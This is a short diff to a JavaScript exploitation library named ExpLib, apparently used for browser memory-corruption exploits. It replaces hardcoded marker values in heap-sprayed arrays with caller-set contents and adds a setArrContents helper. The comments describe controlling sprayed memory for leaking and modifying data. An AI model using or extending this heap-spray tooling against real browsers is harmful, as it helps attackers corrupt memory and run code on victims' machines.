@@ -8,6 +8,10 @@ ExpLib = (function() {
 		this.base = base;
 		this.arr_size = arr_size;
 		this.arr_arr = null;
+		// Allows to control the contents of the sprayed memory.
+		// Have into account some array positions will be corrupted
+		// while leaking and modifying things.
+		this.arr_contents = [];
 
 		this.payload = payload;
 		this.modules = {}
@@ -35,7 +39,6 @@ ExpLib = (function() {
 		return module;
 	}
 
-
 	ExpLib.prototype.spray = function() {
 		this.arr_arr = new Array( num_arrays );
 
@@ -50,13 +53,19 @@ ExpLib = (function() {
 
 		for ( var i = 0; i < num_arrays; ++ i ) {
 			this.arr_arr[i] = eval(decl);
-			this.arr_arr[i][0] = 0x21212121;
-			this.arr_arr[i][1] = 0x22222222;
-			this.arr_arr[i][2] = 0x23232323;
-			this.arr_arr[i][3] = 0x24242424;
+			for(var j = 0; j < this.arr_contents.length; j++) {
+				this.arr_arr[i][j] = this.arr_contents[j];
+			}
 		}
 
   }
+
+	// Should be used before calling spray()
+	ExpLib.prototype.setArrContents = function(contents) {
+		for(var i = 0; i < this.arr_size && i < contents.length; i++) {
+			this.arr_contents[i] = contents[i];
+		}
+	}
 
   ExpLib.prototype.setValue = function(i1, i2, v) {
 		this.arr_arr[i1][i2] = v;
